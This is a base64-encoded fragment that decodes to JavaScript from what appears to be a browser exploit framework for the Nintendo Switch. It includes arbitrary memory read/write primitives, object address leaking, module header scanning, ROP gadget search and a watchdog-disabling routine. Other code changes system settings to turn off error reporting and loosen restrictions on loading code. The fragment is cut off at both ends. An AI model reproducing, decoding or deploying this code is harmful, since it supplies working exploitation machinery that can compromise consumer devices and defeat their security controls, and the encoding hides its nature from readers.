0pO1xuXHRcdFx0cmV0dXJuIHNjLmlwY01zZygzOCkuYkRlc2NyaXB0b3Iob3V0LCA0LCAwKS54RGVzY3JpcHRvcih4MSwgNDgsIDApLnhEZXNjcmlwdG9yKHgyLCA0OCwgMSkuc2VuZFRvKHNlc3Npb24pLmFzUmVzdWx0KCkubWFwKChyKSA9PiBvdXRbMF0pO1xuXHRcdH1cblxuXHRcdHZhciBzZXRTZXR0aW5nID0gZnVuY3Rpb24gKHNlc3Npb24sIGNscywgbmFtLCB2YWx1ZSkgeyAvLyBzZXNzaW9uIGlzIHNldDpmZFxuXHRcdFx0dmFyIGEgPSBuZXcgVWludDMyQXJyYXkoMSk7XG5cdFx0XHRhWzBdID0gdmFsdWU7XG5cdFx0XHR2YXIgeDEgPSB1dGlscy5zdHIyYWIoY2xzKTtcblx0XHRcdHZhciB4MiA9IHV0aWxzLnN0cjJhYihuYW0pO1xuXHRcdFx0cmV0dXJuIHNjLmlwY01zZygyKS54RGVzY3JpcHRvcih4MSwgNDgsIDApLnhEZXNjcmlwdG9yKHgyLCA0OCwgMSkuYURlc2NyaXB0b3IoYSwgNCwgMCkuc2VuZFRvKHNlc3Npb24pLmFzUmVzdWx0KCk7XG5cdFx0fVxuXHRcdHZhciBjbHMgPSAnZXVwbGQnLCBuYW1lID0gJ3VwbG9hZF9lbmFibGVkJztcblx0XHR2YXIgb3JpZyA9IGdldFNldHRpbmcoc2V0c3lzLCBjbHMsIG5hbWUpLmFzc2VydE9rKCk7XG5cdFx0aWYob3JpZyA9PSAxKSB7XG5cdFx0XHR1dGlscy5sb2coJ0Rpc2FibGluZyBlcnJvciB1cGxvYWRpbmcuJyk7XG5cdFx0XHRzZXRTZXR0aW5nKHNldGZkLCBjbHMsIG5hbWUsIDApLmFzc2VydE9rKCk7XG5cdFx0fVxuXG5cdFx0aWYgKHRoaXMudmVyc2lvbiA9PSAnMy4wLjAnKSB7XG5cdFx0XHRvcmlnID0gZ2V0U2V0dGluZyhzZXRzeXMsIFwicm9cIiwgXCJlYXNlX25yb19yZXN0cmljdGlvblwiKS5hc3NlcnRPaygpO1xuXHRcdFx0aWYob3JpZyA9PSAwKSB7XG5cdFx0XHRcdHV0aWxzLmxvZyhcIkVhc2luZyBucm8gcmVzdHJpY3Rpb24uLi5cIik7XG5cdFx0XHRcdHNldFNldHRpbmcoc2V0ZmQsIFwicm9cIiwgXCJlYXNlX25yb19yZXN0cmljdGlvblwiLCAxKS5hc3NlcnRPaygpO1xuXHRcdFx0fVxuXHRcdH1cblx0fSk7XG5cdCAgXG5cdHRoaXMuYXN5bmNDYWxsZXIgPSBuZXcgQXN5bmNDYWxsZXIodGhpcyk7XG5cdHV0aWxzLmxvZygnfn5zdWNjZXNzJyk7XG59O1xuXG5TcGxvaXRDb3JlLnByb3RvdHlwZS5pc0Jyb3dzZXIgPSB0cnVlO1xuU3Bsb2l0Q29yZS5wcm90b3R5cGUubmFtZSA9IFwiYnJvd3NlclwiO1xuXG4vKipcblx0UmV0dXJucyBhZGRyZXNzIG9mIGZ1bmN0aW9uXG5cdEByZXR1cm5zIHt1NjR9IEFkZHJlc3Mgb2YgZnVuY3Rpb24gXG4gKi9cblNwbG9pdENvcmUucHJvdG90eXBlLmdldEZ1bmNBZGRyID0gZnVuY3Rpb24gKCkge1xuXHR0aGlzLmZ1bmMuYXBwbHkoZG9jdW1lbnQsIFsnJ10pOyAvLyBFbnN1cmUgdGhlIGZ1bmMgcG9pbnRlciBpcyBjYWNoZWQgYXQgODo5XG5cdHZhciB0bGZ1bmNhZGRyID0gdGhpcy5nZXRBZGRyKHRoaXMuZnVuYyk7XG5cdHJldHVybiB0aGlzLnJlYWQ4KHRsZnVuY2FkZHIsIDYpO1xufTtcblxuLyoqXG5cdFJlYWRzIDQgYnl0ZXMgZnJvbSBhZGRyZXNzXG5cdEBwYXJhbSB7dTY0fSBhZGRyIC0gQWRkcmVzcyB0byByZWFkIHZhbHVlIGZyb21cblx0QHBhcmFtIHtudW1iZXJ9IFtvZmZzZXQ9MF0gLSBPZmZzZXQgdG8gYWRkIHRvIGFkZHIgYmVmb3JlIHJlYWRcblx0QHJldHVybnMge251bWJlcn1cbiAqL1xuU3Bsb2l0Q29yZS5wcm90b3R5cGUucmVhZDQgPSBmdW5jdGlvbiAoYWRkciwgb2Zmc2V0KSB7XG5cdGlmIChhcmd1bWVudHMubGVuZ3RoID09PSAxKSB7IG9mZnNldCA9IDA7IH1cblxuXHR1dGlscy5hc3NlcnR1NjQoYWRkcik7XG4gIFxuXHR0aGlzLnZhWzRdID0gYWRkclswXTtcblx0dGhpcy52YVs1XSA9IGFkZHJbMV07XG5cdHRoaXMudmFbNl0gPSAxICsgb2Zmc2V0O1xuXHRyZXR1cm4gdGhpcy52YltvZmZzZXRdO1xufTtcblxuLyoqXG5cdFdyaXRlcyA0IGJ5dGVzIHRvIGFkZHJlc3Ncblx0QHBhcmFtIHtudW1iZXJ9IHZhbCAtIFZhbHVlIHRvIHdyaXRlXG5cdEBwYXJhbSB7dTY0fSBhZGRyIC0gQWRkcmVzcyB0byB3cml0ZSB2YWx1ZSB0b1xuXHRAcGFyYW0ge251bWJlcn0gW29mZnNldD0wXSAtIE9mZnNldCB0byBhZGQgdG8gYWRkciBiZWZvcmUgd3JpdGVcbiAqL1xuU3Bsb2l0Q29yZS5wcm90b3R5cGUud3JpdGU0ID0gZnVuY3Rpb24gKHZhbCwgYWRkciwgb2Zmc2V0KSB7XG5cdGlmIChhcmd1bWVudHMubGVuZ3RoID09PSAyKSB7IG9mZnNldCA9IDA7IH1cblxuXHR0aGlzLnZhWzRdID0gYWRkclswXTtcblx0dGhpcy52YVs1XSA9IGFkZHJbMV07XG5cdHRoaXMudmFbNl0gPSAxICsgb2Zmc2V0O1xuXG5cdHRoaXMudmJbb2Zmc2V0XSA9IHZhbDtcbn07XG5cbi8qKlxuXHRSZWFkcyA4IGJ5dGVzIGZyb20gYWRkcmVzc1xuXHRAcGFyYW0ge3U2NH0gYWRkciAtIEFkZHJlc3MgdG8gcmVhZCB2YWx1ZSBmcm9tXG5cdEBwYXJhbSB7bnVtYmVyfSBbb2Zmc2V0PTBdIC0gT2Zmc2V0IHRvIGFkZCB0byBhZGRyIGJlZm9yZSByZWFkXG5cdEByZXR1cm5zIHtudW1iZXJ9XG4gKi9cblNwbG9pdENvcmUucHJvdG90eXBlLnJlYWQ4ID0gZnVuY3Rpb24gKGFkZHIsIG9mZnNldCkge1xuXHRpZiAoYXJndW1lbnRzLmxlbmd0aCA9PT0gMSkgeyBvZmZzZXQgPSAwOyB9XG5cdHJldHVybiBbdGhpcy5yZWFkNChhZGRyLCBvZmZzZXQpLCB0aGlzLnJlYWQ0KGFkZHIsIG9mZnNldCArIDEpXTtcbn07XG5cbi8qKlxuXHRXcml0ZXMgOCBieXRlcyB0byBhZGRyZXNzXG5cdEBwYXJhbSB7bnVtYmVyfSB2YWwgLSBWYWx1ZSB0byB3cml0ZVxuXHRAcGFyYW0ge3U2NH0gYWRkciAtIEFkZHJlc3MgdG8gd3JpdGUgdmFsdWUgdG9cblx0QHBhcmFtIHtudW1iZXJ9IFtvZmZzZXQ9MF0gLSBPZmZzZXQgdG8gYWRkIHRvIGFkZHIgYmVmb3JlIHdyaXRlXG4gKi9cblNwbG9pdENvcmUucHJvdG90eXBlLndyaXRlOCA9IGZ1bmN0aW9uICh2YWwsIGFkZHIsIG9mZnNldCkge1xuXHRpZiAoYXJndW1lbnRzLmxlbmd0aCA9PT0gMikgeyBvZmZzZXQgPSAwOyB9XG5cdHZhbCA9IHV0aWxzLnBhZDY0KHZhbCk7XG5cdHRoaXMud3JpdGU0KHZhbFswXSwgYWRkciwgb2Zmc2V0KTtcblx0dGhpcy53cml0ZTQodmFsWzFdLCBhZGRyLCBvZmZzZXQgKyAxKTtcbn07XG5cbi8qKlxuXHRDYWxscyBjYWxsYmFjayB3aXRoIGFuIEFycmF5QnVmZmVyIHBvaW50aW5nIHRvIHRoZSB2aWV3IG9mIG1lbW9yeSByZXF1ZXN0ZWQuPGJyPlxuXHRJZiB5b3UgcmV0dXJuIGEgdmFsdWUgZnJvbSB3aXRoaW4gdGhlIGNhbGxiYWNrIGl0IHdpbGwgYmUgcmV0dXJuZWQgYnkge0BsaW5rIFNwbG9pdENvcmUjbWVtdmlld308YnI+XG5cdDxiPldhcm5pbmc6PC9iPiBJZiB5b3Uga2VlcCB0aGF0IHZpZXcgb3IgYW55IG9iamVjdCB1c2luZyBpdCBhcm91bmQ7IHlvdSB3aWxsIHRhbmsgdGhlIEdDIGFuZCB5b3VyIFN3aXRjaCB3aWxsIGNyYXNoLlxuXHRAcGFyYW0ge3U2NH0gYWRkciAtIEJhc2UgYWRkcmVzcyBmb3Igdmlld1xuXHRAcGFyYW0ge251bWJlcn0gc2l6ZSAtIE51bWJlciBvZiBieXRlcyB0byB2aWV3XG5cdEBwYXJhbSB7ZnVuY3Rpb259IGZ1bmMgLSBGdW5jdGlvbiB3aGljaCBpcyBjYWxsZWQgd2l0aCBBcnJheUJ1ZmZlci5cblx0QHJldHVybnMge2FueX0gVmFsdWUgcmV0dXJuZWQgYnkgZnVuY1xuICovXG5TcGxvaXRDb3JlLnByb3RvdHlwZS5tZW12aWV3ID0gZnVuY3Rpb24gKGFkZHIsIHNpemUsIGZ1bmMpIHtcblx0dmFyIGFiID0gbmV3IEFycmF5QnVmZmVyKDApO1xuXHR2YXIgdGFkZHIgPSB0aGlzLnJlYWQ4KHRoaXMuZ2V0QWRkcihhYiksIDQpO1xuXG5cdHZhciBvcmlnUHRyID0gdGhpcy5yZWFkOCh0YWRkciwgNik7XG5cdHZhciBvcmlnU2l6ZSA9IHRoaXMucmVhZDQodGFkZHIsIDgpO1xuXHR0aGlzLndyaXRlOChhZGRyLCB0YWRkciwgNik7XG5cdHRoaXMud3JpdGU0KHNpemUsIHRhZGRyLCA4KTtcblxuXHR2YXIgcmV0ID0gZnVuYy5hcHBseSh0aGlzLCBbYWJdKTtcblxuXHR0aGlzLndyaXRlOChvcmlnUHRyLCB0YWRkciwgNik7XG5cdHRoaXMud3JpdGU0KG9yaWdTaXplLCB0YWRkciwgOCk7XG5cblx0cmV0dXJuIHJldDtcbn07XG5cbi8qKlxuXHRSZXR1cm5zIGFkZHJlc3Mgb2Ygb2JqZWN0XG5cdEBwYXJhbSB7b2JqZWN0fSBvYmogLSBPYmplY3QgdG8gZ2V0IGFkZHJlc3Mgb2Zcblx0QHJldHVybnMge3U2NH0gQWRkcmVzcyBvZiBvYmplY3RcbiAqL1xuU3Bsb2l0Q29yZS5wcm90b3R5cGUuZ2V0QWRkciA9IGZ1bmN0aW9uIChvYmopIHtcblx0dGhpcy5sZWFrZWVbJ2InXSA9IHsnYSc6IG9ian07XG5cdHJldHVybiB0aGlzLnJlYWQ4KHRoaXMucmVhZDgodGhpcy5sZWFrYWRkciwgNCksIDQpO1xufTtcblxuLyoqXG5cdENhbGN1bGF0ZSBhZGRyZXNzIHJlbGF0aXZlIHRvIG1haW4gYWRkcmVzc1xuXHRAcGFyYW0ge3U2NH0gb2ZmIC0gT2Zmc2V0XG5cdEByZXR1cm5zIHt1NjR9IFJlbGF0aXZlIGFkZHJlc3NcbiAqL1xuU3Bsb2l0Q29yZS5wcm90b3R5cGUubXJlZiA9IGZ1bmN0aW9uIChvZmYpIHtcblx0cmV0dXJuIHV0aWxzLmFkZDIodGhpcy5tYWluYWRkciwgb2ZmKTtcbn07XG5cbi8qKlxuXHRSZXR1cm5zIGJhc2UgYWRkcmVzcyBvZiBjdXJyZW50IG1vZHVsZVxuXHRAcHJpdmF0ZVxuXHRAcmV0dXJucyB7dTY0fVxuICovXG5TcGxvaXRDb3JlLnByb3RvdHlwZS5nZXRCYXNlID0gZnVuY3Rpb24gKCkge1xuXHR2YXIgZnVuY2FkZHIgPSB0aGlzLmdldEZ1bmNBZGRyKCk7XG5cblx0dXRpbHMuZGxvZygnU2VhcmNoaW5nIGZvciBzdGFydCBvZiBtb2R1bGUuJyk7XG5cblx0dmFyIGJhc2VhZGRyID0gdGhpcy5yZWFkOChmdW5jYWRkciwgOCk7XG5cdGJhc2VhZGRyWzBdID0gKGJhc2VhZGRyWzBdICYgMHhGRkZGRjAwMCkgPj4+IDA7XG5cdHdoaWxlICh0aGlzLnJlYWQ0KGJhc2VhZGRyLCA0KSAhPT0gMHgzMDRGNTI0RSkgeyBiYXNlYWRkciA9IHV0aWxzLmFkZDIoYmFzZWFkZHIsIC00MDk2KTsgfVxuXG5cdHV0aWxzLmRsb2coJ0ZpcnN0IG1vZHVsZSAuLi4gJyArIHV0aWxzLnBhZGRyKGJhc2VhZGRyKSk7XG5cblx0cmV0dXJuIGJhc2VhZGRyO1xufTtcblxuLyoqXG5cdFRPRE8gRE9DU1xuXHRAcHJpdmF0ZVxuICovXG5TcGxvaXRDb3JlLnByb3RvdHlwZS53YWxrTGlzdCA9IGZ1bmN0aW9uICgpIHtcblx0dmFyIGFkZHIgPSB0aGlzLmJhc2U7XG5cdHV0aWxzLmRsb2coJ0luaXRpYWwgTlJPIGF0ICcgKyB1dGlscy5wYWRkcihhZGRyKSk7XG5cblx0d2hpbGUgKHRydWUpIHtcblx0XHR2YXIgbW9kb2ZmID0gdGhpcy5yZWFkNChhZGRyLCAxKTtcblx0XHRhZGRyID0gdXRpbHMuYWRkMihhZGRyLCBtb2RvZmYpO1xuXHRcdHZhciBtb2RzdHIgPSB0aGlzLnJlYWQ0KGFkZHIsIDYpO1xuXHRcdGFkZHIgPSB1dGlscy5hZGQyKGFkZHIsIG1vZHN0cik7XG5cblx0XHQvLyBSZWFkIG5leHQgbGluayBwdHJcblx0XHRhZGRyID0gdGhpcy5yZWFkOChhZGRyKTtcblx0XHRpZiAodXRpbHMubnVsbHB0cihhZGRyKSkge1xuXHRcdFx0dXRpbHMubG9nKCdSZWFjaGVkIGVuZCcpO1xuXHRcdFx0YnJlYWs7XG5cdFx0fVxuXG5cdFx0dmFyIG5ybyA9IHRoaXMucmVhZDgoYWRkciwgOCk7XG5cblx0XHRpZiAodXRpbHMubnVsbHB0cihucm8pKSB7XG5cdFx0XHR1dGlscy5kbG9nKCdIaXQgUlRMRCBhdCAnICsgdXRpbHMucGFkZHIoYWRkcikpO1xuXHRcdFx0YWRkciA9IHRoaXMucmVhZDgoYWRkciwgNCk7XG5cdFx0XHRicmVhaztcblx0XHR9XG5cblx0XHRpZiAodGhpcy5yZWFkNChucm8sIDQpICE9PSAweDMwNGY1MjRlKSB7XG5cdFx0XHR1dGlscy5sb2coJ1NvbWV0aGluZyBpcyB3cm9uZy4gIE5vIE5STyBoZWFkZXIgYXQgYmFzZS4nKTtcblx0XHRcdGJyZWFrO1xuXHRcdH1cblxuXHRcdGFkZHIgPSBucm87XG5cdFx0dXRpbHMuZGxvZygnRm91bmQgTlJPIGF0ICcgKyB1dGlscy5wYWRkcihucm8pKTtcblx0fVxuXG5cdHdoaWxlICh0cnVlKSB7XG5cdFx0bnJvID0gdGhpcy5yZWFkOChhZGRyLCA4KTtcblx0XHRpZiAodXRpbHMubnVsbHB0cihucm8pKSB7XG5cdFx0XHR1dGlscy5kbG9nKCdIbSwgaGl0IHRoZSBlbmQgb2YgdGhpbmdzLiAgQmFjayBpbiBydGxkPycpO1xuXHRcdFx0cmV0dXJuO1xuXHRcdH1cblxuXHRcdGlmICh0aGlzLnJlYWQ0KG5ybywgdGhpcy5yZWFkNChucm8sIDEpID4+IDIpID09PSAweDMwNDQ0ZjRkKSB7XG5cdFx0XHR1dGlscy5kbG9nKCdHb3QgTU9EIGF0ICcgKyB1dGlscy5wYWRkcihucm8pKTtcblx0XHRcdGlmICh0aGlzLnJlYWQ0KG5ybywgNCkgPT09IDB4OERDREY4ICYmIHRoaXMucmVhZDQobnJvLCA1KSA9PT0gMHg5NTk2MjApIHtcblx0XHRcdFx0dXRpbHMuZGxvZygnRm91bmQgbWFpbiBtb2R1bGUuJyk7XG5cdFx0XHRcdHRoaXMud2lmaUFwcGxldCA9IHRydWU7XG5cdFx0XHRcdHJldHVybiBucm87XG5cdFx0XHR9IGVsc2UgaWYgKHRoaXMucmVhZDQobnJvLCA0KSA9PT0gMHgyYTAxMDNmMyAmJiB0aGlzLnJlYWQ0KG5ybywgNSkgPT09IDB4OTQwMDAwMDIpIHtcblx0XHRcdFx0dXRpbHMuZGxvZygnRm91bmQgbWFpbiBtb2R1bGUuJyk7XG5cdFx0XHRcdHRoaXMud2lmaUFwcGxldCA9IGZhbHNlO1xuXHRcdFx0XHRyZXR1cm4gdXRpbHMuYWRkMihucm8sIDB4NjAwMCk7XG5cdFx0XHR9XG5cdFx0fSBlbHNlIHtcblx0XHRcdHV0aWxzLmRsb2coJ05vIHZhbGlkIE1PRCBoZWFkZXIuICBCYWNrIGF0IFJUTEQuJyk7XG5cdFx0XHRicmVhaztcblx0XHR9XG5cblx0XHRhZGRyID0gdGhpcy5yZWFkOChhZGRyLCAwKTtcblx0XHRpZiAodXRpbHMubnVsbHB0cihhZGRyKSkge1xuXHRcdFx0dXRpbHMuZGxvZygnRW5kIG9mIGNoYWluLicpO1xuXHRcdFx0YnJlYWs7XG5cdFx0fVxuXHR9XG59O1xuXG4vKipcblx0UmV0dXJucyBhIGNhY2hlIG9mIGdhZGdldHMgZm9yIHNwZWVkIGJvb3N0XG5cdEBwcml2YXRlXG5cdEByZXR1cm5zIHtvYmplY3R9XG4gKi9cblNwbG9pdENvcmUucHJvdG90eXBlLmxvYWRDYWNoZSA9IGZ1bmN0aW9uICgpIHtcblx0dmFyIHNlbGYgPSB0aGlzO1xuXHRmdW5jdGlvbiBjaGVja0dhZGdldCAoYmFzZSwgc2l6ZSwgZ2FkZ2V0LCBvZmZzZXQpIHtcblx0XHRpZiAob2Zmc2V0ICsgZ2FkZ2V0Lmxlbmd0aCA+PSBzaXplKSB7IHJldHVybiBmYWxzZTsgfVxuXHRcdHJldHVybiBzZWxmLm1lbXZpZXcodXRpbHMuYWRkMihiYXNlLCBvZmZzZXQpLCBnYWRnZXQubGVuZ3RoLCBmdW5jdGlvbiAoYWIpIHtcblx0XHRcdHZhciB1OCA9IG5ldyBVaW50OEFycmF5KGFiKTtcblx0XHRcdGZvciAodmFyIGkgPSAwOyBpIDwgZ2FkZ2V0Lmxlbmd0aDsgKytpKSB7XG5cdFx0XHRcdGlmIChnYWRnZXRbaV0gIT09IC0xICYmIGdhZGdldFtpXSAhPT0gdThbaV0pIHsgcmV0dXJuIGZhbHNlOyB9XG5cdFx0XHR9XG5cdFx0XHRyZXR1cm4gdHJ1ZTtcblx0XHR9KTtcblx0fVxuXHR2YXIgcmVxdWVzdCA9IG5ldyBYTUxIdHRwUmVxdWVzdCgpO1xuXHRyZXF1ZXN0Lm9wZW4oJ0dFVCcsICcvY2FjaGUnLCBmYWxzZSk7XG5cdHJlcXVlc3Quc2VuZChudWxsKTtcblx0aWYgKHJlcXVlc3Quc3RhdHVzID09PSAyMDApIHtcblx0XHR2YXIgY2FjaGUgPSBKU09OLnBhcnNlKHJlcXVlc3QucmVzcG9uc2VUZXh0KTtcblx0XHRmb3IgKHZhciBrZXkgaW4gY2FjaGUpIHtcblx0XHRcdHZhciBvZmZzZXQgPSBjYWNoZVtrZXldO1xuXHRcdFx0a2V5ID0gSlNPTi5wYXJzZSgnWycgKyBrZXkgKyAnXScpO1xuXHRcdFx0aWYgKCFjaGVja0dhZGdldCh0aGlzLm1haW5hZGRyLCB0aGlzLm1haW5UZXh0U2l6ZSwga2V5LCBvZmZzZXQpICYmICFjaGVja0dhZGdldCh0aGlzLmJhc2UsIHRoaXMud2tjVGV4dFNpemUsIGtleSwgb2Zmc2V0KSkge1xuXHRcdFx0XHR1dGlscy5sb2coJ0dhZGdldCBjYWNoZSBpbnZhbGlkJyk7XG5cdFx0XHRcdHJldHVybiB7fTtcblx0XHRcdH1cblx0XHR9XG5cdFx0cmV0dXJuIGNhY2hlO1xuXHR9IGVsc2UgeyByZXR1cm4ge307IH1cbn07XG5cblxuLy8gWFhYOiBNYWtlIHRoaXMgd29yayBvbiB1aW50MzJzLiAgV2F5IGZhc3Rlci5cblxuLyoqXG5cdEZpbmRzIGEgZ2FkZ2V0IHRoYXQgbWF0Y2hlcyByZXF1aXJlZCBwYXR0ZXJuXG5cdEBwYXJhbSB7QXJyYXkuPG51bWJlcj59IGlucHV0IC0gSGV4IHBhdHRlcm4gdG8gbWF0Y2hcblx0QHBhcmFtIHtib29sZWFufSBpbldrYyAtIFNlYXJjaCBpbiB3a2Ncblx0QHJldHVybnMge3U2NHxudWxsfSBBZGRyZXNzIG9mIGdhZGdldCwgb3IgbnVsbCBpZiBub3QgZm91bmQuIFxuICovXG5TcGxvaXRDb3JlLnByb3RvdHlwZS5nYWRnZXQgPSBmdW5jdGlvbiAoaW5wdXQsIGluV2tjKSB7XG5cdGlmIChhcmd1bWVudHMubGVuZ3RoID09PSAxKSB7IGluV2tjID0gZmFsc2U7IH1cblxuXHR2YXIgYnl0ZXM7XG5cdGlmICh0eXBlb2YgKGlucHV0KSA9PT0gJ3N0cmluZycpIHtcblx0XHR2YXIgYXJyID0gW107XG5cdFx0Zm9yICh2YXIgaSA9IDA7IGkgPCBpbnB1dC5sZW5ndGg7IGkgKz0gMikge1xuXHRcdFx0YXJyLnB1c2gocGFyc2VJbnQoaW5wdXQuc3Vic3RyaW5nKGksIGkgKyAyKSwgMTYpKTtcblx0XHR9XG5cdFx0Ynl0ZXMgPSBhcnI7XG5cdH0gZWxzZSB7XG5cdFx0Ynl0ZXMgPSBpbnB1dDtcblx0fVxuXG5cdHZhciB0YSA9IGluV2tjID8gdGhpcy5iYXNlIDogdGhpcy5tYWluYWRkcjtcblxuXHRpZiAoYnl0ZXMgaW4gdGhpcy5nYWRnZXRDYWNoZSkge1xuXHRcdC8vIHV0aWxzLmRsb2coJ0ZvdW5kIGJ5dGVzIGluIGdhZGdldCBjYWNoZScpO1xuXHRcdHJldHVybiB1dGlscy5hZGQyKHRhLCB0aGlzLmdhZGdldENhY2hlW2J5dGVzXSk7XG5cdH1cblxuXHR2YXIgdHMgPSBpbldrYyA/IHRoaXMud2tjVGV4dFNpemUgOiB0aGlzLm1haW5UZXh0U2l6ZTtcblxuXHR2YXIgc3MgPSB0cyAtIGJ5dGVzLmxlbmd0aDtcblx0dmFyIHBhaXIgPSB0aGlzLm1lbXZpZXcodGEsIHRzLCBmdW5jdGlvbiAoYWIpIHtcblx0XHR2YXIgdTggPSBuZXcgVWludDhBcnJheShhYik7XG5cdFx0Zm9yICh2YXIgaSA9IDA7IGkgPCBzczsgaSArPSA0KSB7XG5cdFx0XHR2YXIgbWlzcyA9IGZhbHNlO1xuXHRcdFx0Zm9yICh2YXIgaiA9IDA7IGogPCBieXRlcy5sZW5ndGg7ICsraikge1xuXHRcdFx0XHRpZiAoYnl0ZXNbal0gIT09IC0xICYmIHU4W2kgKyBqXSAhPT0gYnl0ZXNbal0pIHtcblx0XHRcdFx0XHRtaXNzID0gdHJ1ZTtcblx0XHRcdFx0XHRicmVhaztcblx0XHRcdFx0fVxuXHRcdFx0fVxuXHRcdFx0aWYgKCFtaXNzKSB7XG5cdFx0XHRcdHZhciBhZGRyID0gdXRpbHMuYWRkMih0YSwgaSk7XG5cdFx0XHRcdHV0aWxzLmxvZygnRm91bmQgZ2FkZ2V0IGF0ICcgKyB1dGlscy5wYWRkcihhZGRyKSk7XG5cdFx0XHRcdHJldHVybiBbYWRkciwgaV07XG5cdFx0XHR9XG5cdFx0fVxuXHRcdHJldHVybiBudWxsO1xuXHR9KTtcblxuXHRpZiAocGFpciA9PT0gbnVsbCkge1xuXHRcdHZhciBmID0gJyc7XG5cdFx0Zm9yIChpID0gMDsgaSA8IGJ5dGVzLmxlbmd0aDsgKytpKSB7XG5cdFx0XHRmICs9ICgnMCcgKyBieXRlc1tpXS50b1N0cmluZygxNikpLnNsaWNlKC0yKSArICcgJztcblx0XHR9XG5cdFx0dXRpbHMubG9nKCdDb3VsZCBub3QgZmluZCBnYWRnZXQgd2l0aCBieXRlczogJyArIGYpO1xuXHRcdHRocm93IG5ldyBFcnJvcignQmFkIGdhZGdldCcpO1xuXHR9XG5cblx0dGhpcy5nYWRnZXRDYWNoZVtieXRlc10gPSBwYWlyWzFdO1xuXHR1dGlscy5wdXNoQ2FjaGUodGhpcy5nYWRnZXRDYWNoZSk7XG5cdHJldHVybiBwYWlyWzBdO1xufTtcblxuLyoqXG5cdERpc2FibGVzIHRoZSBicm93c2VyIHdhdGNoZG9nXG4gKi9cblNwbG9pdENvcmUucHJvdG90eXBlLmRpc2FibGVXYXRjaGRvZyA9IGZ1bmN0aW9uICgpIHtcblx0dmFyIGNvbW1vbl9ieXRlID0gbmF2aWdhdG9yLnVzZXJBZ2VudC5pbmRleE9mKCc0LjAuMC42LjknKSAhPSAtMSA/IDB4NzMgOiAweDUzO1xuXHR2YXIgdm0gPSB0aGlzLmNhbGwodGhpcy5nYWRnZXQoWzB4RkYsIDB4MDMsIDB4MDEsIDB4RDEsIDB4RjQsIDB4NEYsIDB4MDIsIDB4QTksIDB4RkQsIDB4N0IsIDB4MDMsIDB4QTksIDB4RkQsIDB4QzMsIDB4MDAsIDB4OTEsIChjb21tb25fYnl0ZSksIC0xLCAtMSwgLTEsIDB4NzMsIC0xLCAtMSwgLTEsIDB4NjAsIDB4MjIsIDB4MDAsIDB4OTEsIDB4MDgsIDB4RkMsIDB4REYsIDB4MDgsIDB4NDgsIDB4MDEsIDB4MDAsIDB4MzddLCB0cnVlKSk7XG5cdHV0aWxzLmxvZyhcIlZNOiBcIiArIHV0aWxzLnBhZGRyKHZtKSk7XG5cblx0dmFyIHdkID0gdGhpcy5yZWFkOCh1dGlscy5hZGQyKHZtLCAweDI3NjgpKTtcblx0dXRpbHMubG9nKFwiV0Q6IFwiICsgdXRpbHMucGFkZHIod2QpKTtcblxuXHR2YXIgcmV0MCA9IHRoaXMuZ2FkZ2V0KFsweGUwLCAweDAzLCAweDFmLCAweGFhLCAweGMwLCAweDAzLCAweDVmLCAweGQ2XSk7XG5cblx0dmFyIGN1cnJlbnQgPSB0aGlzLnJlYWQ4KHdkLCA4ID4+IDIpO1xuXHRpZiAoY3VycmVudFswXSAhPSAweEZGRkZGRkZGIHx8IGN1cnJlbnRbMV0gIT0gMHg3RkZGRkZGRikge1xuXHRcdHRoaXMuY2FsbCh0aGlzLmdhZGdldChbMHhGOSwgMHgwRiwgMHgxQiwgMHhGOCwgMHhGOCwgMHg1RiwgMHgwMSwgMHhBOSwgMHhGNiwgMHg1NywgMHgwMiwgMHhBOSwgMHhGNCwgMHg0RiwgMHgwMywgMHhBOSwgMHhGRCwgMHg3QiwgMHgwNCwgMHhBOSwgMHhGRCwgMHgwMywgMHgwMSwgMHg5MSwgMHhGMywgMHgwMywgMHgwMCwgMHhBQSwgMHg3OSwgMHgwNiwgMHg0MCwgMHhGOSwgMHg2OCwgMHg5MiwgMHg0MCwgMHgzOV0sIHRydWUpLCBbd2QsIHZtLCBbMHhGRkZGRkZGRiwgMHg3RkZGRkZGRl0sIHJldDAsIDAsIDBdKTtcblx0fVxufTtcblxuLyoqXG5cdFJldHVybnMgdGhlIGFkZHJlc3Mgb2YgU1Bcblx0QHJldHVybnMge3U2NH0gQWRkcmVzcyBvZiBTUFxuICovXG5TcGxvaXRDb3JlLnByb3RvdHlwZS5nZXRTUCA9IGZ1bmN0aW9uICgpIHtcblx0Ly8gRmlyc3QgZ2FkZ2V0XG5cdHZhciBqYWRkciA9IHRoaXMuZ2FkZ2V0KFsweDc0LCAweDMyLCAweDQwLCAweEY5LCAweDdGLCAweDNFLCAweDAwLCAweEY5LCAweDE0LCAweDAxLCAweDAwLCAweEI0LCAweDgwLCAweDBBLCAweDQwLCAweEY5XSk7XG5cblx0dXRpbHMuZGxvZygnTmV3IGp1bXAgYXQgJyArIHV0aWxzLnBhZGRyKGphZGRyKSk7XG5cdHV0aWxzLmRsb2coJ0Fzc2lnbmluZyBmdW5jdGlvbiBwb2ludGVyJyk7XG5cblx0dmFyIGNhcnIgPSBuZXcgVWludDMyQXJyYXkoMTYpO1xuXHR2YXIgY2J1ZiA9IHRoaXMucmVhZDgodGhpcy5nZXRBZGRyKGNhcnIpLCA0KTtcblxuXHR2YXIgc3RydWN0MSA9IHRoaXMubWFsbG9jKDB4NDgpO1xuXHR2YXIgc3RydWN0MiA9IHRoaXMubWFsbG9jKDB4MjgpO1xuXHR2YXIgc3RydWN0MyA9IHRoaXMubWFsbG9jKDB4NTE4KTtcblx0dmFyIHN0cnVjdDQgPSB0aGlzLm1hbGxvYygweDM4KTtcblxuXHR0aGlzLndyaXRlOChzdHJ1Y3QxLCBjYnVmLCAwKTtcblx0dGhpcy53cml0ZTgodGhpcy5nYWRnZXQoWzB4MDksIDB4MDksIDB4NDAsIDB4ZjksIDB4MDAsIDB4MDEsIDB4NDAsIDB4ZjksIDB4MDEsIDB4MjksIDB4NDAsIDB4YjksIDB4MDIsIDB4MWQsIDB4NDAsIDB4ZjksIDB4MjAsIDB4MDEsIDB4M2YsIDB4ZDZdKSwgY2J1ZiwgMHg4ID4+IDIpO1xuXHR0aGlzLndyaXRlOCh0aGlzLmdhZGdldChbMHgwOCwgMHgwOCwgMHg0MCwgMHhmOSwgMHgwMCwgMHgwMSwgMHg0MCwgMHhmOSwgMHgwNSwgMHgxMCwgMHg0MCwgMHhmOSwgMHhhMCwgMHgwMCwgMHgxZiwgMHhkNl0pLCBjYnVmLCAweDEwID4+IDIpO1xuXG5cdHRoaXMud3JpdGU4KHRoaXMuZ2FkZ2V0KFsweEU4LCAweDAzLCAweDAwLCAweEFBLCAweDAyLCAweDA1LCAw